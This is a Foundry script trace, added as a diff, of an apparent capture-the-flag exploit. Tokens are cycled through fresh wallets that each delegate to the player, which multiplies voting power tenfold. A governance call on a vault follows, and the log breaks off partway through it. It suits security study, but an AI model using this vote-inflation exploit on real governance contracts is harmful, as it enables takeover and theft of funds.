@@ -1,0 +1,382 @@
+Compiling 1 files with Solc 0.8.13
+Solc 0.8.13 finished in 1.00s
+Compiler run successful with warnings:
+Warning (2018): Function state mutability can be restricted to pure
+  --> src/Exploit.sol:58:5:
+   |
+58 |     function proxiableUUID() external view returns (bytes32 slot) {
+   |     ^ (Relevant source part starts here and spans across multiple lines).
+
+Traces:
+  [2674153] → new Deploy@0x5b73C5498c1E3b4dbA84de0F1833c4a029d90519
+    └─ ← [Return] 13244 bytes of code
+
+  [1024272107] Deploy::run()
+    ├─ [0] VM::envString("RPC_URL") [staticcall]
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::envUint("PRIVATE_KEY") [staticcall]
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::envAddress("CHALLENGE_CONTRACT_ADDRESS") [staticcall]
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::startBroadcast()
+    │   └─ ← [Return] 
+    ├─ [317103] → new Exploit@0x1640c858ECF84d663CdC44FB2171a3CbdC90B336
+    │   └─ ← [Return] 1473 bytes of code
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [62625] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::claim()
+    │   ├─ [51913] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::mint(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, 10000000000000000000000 [1e22])
+    │   │   ├─ emit Transfer(from: 0x0000000000000000000000000000000000000000, to: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, value: 10000000000000000000000 [1e22])
+    │   │   └─ ← [Stop] 
+    │   └─ ← [Stop] 
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0x4EC1eAfF708624ea400a7A477b4bf0F8f78b534a
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [25724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x4EC1eAfF708624ea400a7A477b4bf0F8f78b534a, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, to: 0x4EC1eAfF708624ea400a7A477b4bf0F8f78b534a, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x4EC1eAfF708624ea400a7A477b4bf0F8f78b534a)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [94976] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::delegate(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateChanged(delegator: 0x4EC1eAfF708624ea400a7A477b4bf0F8f78b534a, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateVotesChanged(delegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, previousBalance: 0, newBalance: 10000000000000000000000 [1e22])
+    │   └─ ← [Stop] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [23724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x4EC1eAfF708624ea400a7A477b4bf0F8f78b534a, to: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0x7164107B593F2E4Fc9FB7F230158E46f48b5e79C
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [25724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x7164107B593F2E4Fc9FB7F230158E46f48b5e79C, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, to: 0x7164107B593F2E4Fc9FB7F230158E46f48b5e79C, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x7164107B593F2E4Fc9FB7F230158E46f48b5e79C)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [29489] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::delegate(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateChanged(delegator: 0x7164107B593F2E4Fc9FB7F230158E46f48b5e79C, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateVotesChanged(delegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, previousBalance: 10000000000000000000000 [1e22], newBalance: 20000000000000000000000 [2e22])
+    │   └─ ← [Stop] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [23724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x7164107B593F2E4Fc9FB7F230158E46f48b5e79C, to: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0x74f63C14891C8F647Df741df1d57EB38F71D96f1
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [25724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x74f63C14891C8F647Df741df1d57EB38F71D96f1, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, to: 0x74f63C14891C8F647Df741df1d57EB38F71D96f1, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x74f63C14891C8F647Df741df1d57EB38F71D96f1)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [29489] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::delegate(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateChanged(delegator: 0x74f63C14891C8F647Df741df1d57EB38F71D96f1, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateVotesChanged(delegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, previousBalance: 20000000000000000000000 [2e22], newBalance: 30000000000000000000000 [3e22])
+    │   └─ ← [Stop] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [23724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x74f63C14891C8F647Df741df1d57EB38F71D96f1, to: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0x386B550579E90a2b967ffad7058Ce628F2Ad7fA4
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [25724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x386B550579E90a2b967ffad7058Ce628F2Ad7fA4, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, to: 0x386B550579E90a2b967ffad7058Ce628F2Ad7fA4, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x386B550579E90a2b967ffad7058Ce628F2Ad7fA4)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [29489] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::delegate(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateChanged(delegator: 0x386B550579E90a2b967ffad7058Ce628F2Ad7fA4, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateVotesChanged(delegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, previousBalance: 30000000000000000000000 [3e22], newBalance: 40000000000000000000000 [4e22])
+    │   └─ ← [Stop] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [23724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x386B550579E90a2b967ffad7058Ce628F2Ad7fA4, to: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0x7B6577C12b57a03a23E15cf772c0E5AeCcb5d388
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [25724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x7B6577C12b57a03a23E15cf772c0E5AeCcb5d388, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, to: 0x7B6577C12b57a03a23E15cf772c0E5AeCcb5d388, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x7B6577C12b57a03a23E15cf772c0E5AeCcb5d388)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [29489] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::delegate(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateChanged(delegator: 0x7B6577C12b57a03a23E15cf772c0E5AeCcb5d388, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateVotesChanged(delegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, previousBalance: 40000000000000000000000 [4e22], newBalance: 50000000000000000000000 [5e22])
+    │   └─ ← [Stop] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [23724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x7B6577C12b57a03a23E15cf772c0E5AeCcb5d388, to: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0xFca82694bD3bd2D21e0eb52d7088eABA668487AF
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [25724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0xFca82694bD3bd2D21e0eb52d7088eABA668487AF, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, to: 0xFca82694bD3bd2D21e0eb52d7088eABA668487AF, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0xFca82694bD3bd2D21e0eb52d7088eABA668487AF)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [29489] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::delegate(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateChanged(delegator: 0xFca82694bD3bd2D21e0eb52d7088eABA668487AF, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateVotesChanged(delegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, previousBalance: 50000000000000000000000 [5e22], newBalance: 60000000000000000000000 [6e22])
+    │   └─ ← [Stop] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [23724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0xFca82694bD3bd2D21e0eb52d7088eABA668487AF, to: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0xF2BA50467Efb45322D41A0309e2694F7Df87c558
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [25724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0xF2BA50467Efb45322D41A0309e2694F7Df87c558, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, to: 0xF2BA50467Efb45322D41A0309e2694F7Df87c558, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0xF2BA50467Efb45322D41A0309e2694F7Df87c558)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [29489] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::delegate(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateChanged(delegator: 0xF2BA50467Efb45322D41A0309e2694F7Df87c558, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateVotesChanged(delegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, previousBalance: 60000000000000000000000 [6e22], newBalance: 70000000000000000000000 [7e22])
+    │   └─ ← [Stop] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [23724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0xF2BA50467Efb45322D41A0309e2694F7Df87c558, to: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0x834257f6020A20b3b3B457d93fF2383b4C6BdDB5
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [25724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x834257f6020A20b3b3B457d93fF2383b4C6BdDB5, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, to: 0x834257f6020A20b3b3B457d93fF2383b4C6BdDB5, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x834257f6020A20b3b3B457d93fF2383b4C6BdDB5)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [29489] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::delegate(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateChanged(delegator: 0x834257f6020A20b3b3B457d93fF2383b4C6BdDB5, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateVotesChanged(delegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, previousBalance: 70000000000000000000000 [7e22], newBalance: 80000000000000000000000 [8e22])
+    │   └─ ← [Stop] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [23724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x834257f6020A20b3b3B457d93fF2383b4C6BdDB5, to: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0xe01DF939bB0E456Ca8Ba89309051Ed063DfB637c
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [25724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0xe01DF939bB0E456Ca8Ba89309051Ed063DfB637c, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, to: 0xe01DF939bB0E456Ca8Ba89309051Ed063DfB637c, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0xe01DF939bB0E456Ca8Ba89309051Ed063DfB637c)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [29489] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::delegate(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateChanged(delegator: 0xe01DF939bB0E456Ca8Ba89309051Ed063DfB637c, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateVotesChanged(delegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, previousBalance: 80000000000000000000000 [8e22], newBalance: 90000000000000000000000 [9e22])
+    │   └─ ← [Stop] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [23724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0xe01DF939bB0E456Ca8Ba89309051Ed063DfB637c, to: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::addr(<pk>) [staticcall]
+    │   └─ ← [Return] 0x012dACa01Aed8e115fdE1d8e864D999dB4f23708
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [25724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x012dACa01Aed8e115fdE1d8e864D999dB4f23708, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, to: 0x012dACa01Aed8e115fdE1d8e864D999dB4f23708, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x012dACa01Aed8e115fdE1d8e864D999dB4f23708)
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [29489] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::delegate(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateChanged(delegator: 0x012dACa01Aed8e115fdE1d8e864D999dB4f23708, fromDelegate: 0x0000000000000000000000000000000000000000, toDelegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   ├─ emit DelegateVotesChanged(delegate: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, previousBalance: 90000000000000000000000 [9e22], newBalance: 100000000000000000000000 [1e23])
+    │   └─ ← [Stop] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [23724] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::transfer(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, 10000000000000000000000 [1e22])
+    │   ├─ emit Transfer(from: 0x012dACa01Aed8e115fdE1d8e864D999dB4f23708, to: 0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72, value: 10000000000000000000000 [1e22])
+    │   └─ ← [Return] true
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast()
+    │   └─ ← [Return] 
+    ├─ [737] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::hexensCoin() [staticcall]
+    │   └─ ← [Return] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B
+    ├─ [1473] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::getCurrentVotes(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72) [staticcall]
+    │   └─ ← [Return] 100000000000000000000000 [1e23]
+    ├─ [0] console::log("Successfully delegated 100_000 ether to player wallet") [staticcall]
+    │   └─ ← [Stop] 
+    ├─ [0] VM::stopBroadcast()
+    │   └─ ← [Return] 
+    ├─ [0] VM::startBroadcast(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72)
+    │   └─ ← [Return] 
+    ├─ [2758] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::diamond() [staticcall]
+    │   └─ ← [Return] 0x6b0c19296b6C774F8E6D8E01dAfE09Ee40871EcB
+    ├─ [2780] 0xED0607cb4F74Db9eAc2Cb60EE8415edd5C666e58::vault() [staticcall]
+    │   └─ ← [Return] 0xff93d359F8E3dDDF4C52AA2966BdB2bE4eFfeB4f
+    ├─ [111991] 0xff93d359F8E3dDDF4C52AA2966BdB2bE4eFfeB4f::governanceCall(0x9dc29fac0000000000000000000000006b0c19296b6c774f8e6d8e01dafe09ee40871ecb0000000000000000000000000000000000000000000000000000000000007a69)
+    │   ├─ [106944] 0x4Ee82d1960243ecbDd5467cc2E7883722372B4b2::governanceCall(0x9dc29fac0000000000000000000000006b0c19296b6c774f8e6d8e01dafe09ee40871ecb0000000000000000000000000000000000000000000000000000000000007a69) [delegatecall]
+    │   │   ├─ [1473] 0xaEA877CBA758cD38639FedC558C037AAAaf2bE7B::getCurrentVotes(0x03FD3a8e5de3f14Aae320645623070ff6b9C3F72) [staticcall]
